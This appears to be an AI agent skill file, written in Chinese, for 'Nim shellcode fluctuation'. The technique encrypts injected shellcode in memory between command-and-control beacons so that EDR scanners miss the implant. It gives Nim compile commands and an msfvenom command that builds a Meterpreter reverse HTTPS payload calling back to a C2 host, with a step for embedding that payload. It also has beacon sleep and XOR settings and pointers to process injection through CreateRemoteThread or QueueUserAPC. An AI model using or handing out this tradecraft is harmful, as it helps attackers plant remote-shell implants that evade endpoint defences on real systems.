---
name: nim-shellcode-fluctuation
description: >
  此技能适用于用户询问关于 "nim-shellcode-fluctuation"、"部署需要在 EDR 内存扫描 RWX 区域时隐藏自身的植入物"、
  "shellcode 内存加密规避" 的问题。
---

# Nim Shellcode Fluctuation

内存规避技术 — 在 C2 回调间隔期间对 RX 页中的 shellcode 进行 XOR/RC4 加密。

## 快速开始

```bash
# 安装 Nim
# nimble install winim

# 编译
nim c -d:release -d:strip --opt:size -o:agent.exe fluctuation.nim

# 注入 shellcode（嵌入到源码中）
# 将 nim 源码中的 SHELLCODE 占位符替换为 msfvenom/Cobalt 的输出
```

## 工作原理

1. Shellcode 被注入到 RX 内存页
2. 睡眠前：就地加密（XOR/RC4），将页属性改为 RW
3. 睡眠后：解密，将页属性改回 RX/RWX
4. EDR 内存扫描在睡眠期间只会看到乱码

## 核心配置

```nim
const SLEEP_MS = 5000       # Sleep between beacons
const XOR_KEY  = 0x41       # Encryption key byte
const FLUCTUATE = true      # Enable/disable fluctuation
```

## 常见工作流

**生成 shellcode 并嵌入：**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=C2 LPORT=443 -f raw -o shell.bin
# Base64 编码后嵌入 nim 源码
python3 -c "import base64; print(base64.b64encode(open('shell.bin','rb').read()).decode())"
```

**结合进程注入：**
```nim
# Use createRemoteThread or QueueUserAPC for injection
# then enable fluctuation in the injected thread
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | APC 注入变体和 EDR 绕过说明 |
